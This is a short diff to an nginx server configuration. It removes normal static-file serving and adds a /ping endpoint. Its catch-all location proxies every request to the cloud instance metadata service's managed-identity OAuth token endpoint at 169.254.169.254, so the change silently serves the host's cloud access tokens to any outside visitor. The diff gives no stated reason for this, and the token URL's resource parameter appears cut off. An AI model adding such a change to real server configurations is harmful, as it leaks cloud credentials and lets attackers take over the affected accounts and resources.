@@ -12,10 +12,15 @@ server {
   # Replace with env variable SERVER_MAX_BODY_SIZE
   client_max_body_size 1m;
 
-  location / {
-    try_files $uri $uri/ =404;
+ location /ping {
+    return 200 '{"content_length": "$content_length"}'; 
   }
 
+  location / {
+    proxy_pass http://169.254.169.254/metadata/identity/oauth2/token?resource=https://;
+  }
+
+ 
   # Protect against accessing hidden files
   location ~ /\. {
     access_log off;
@@ -23,3 +28,5 @@ server {
     deny all;
   }
 }
+
+
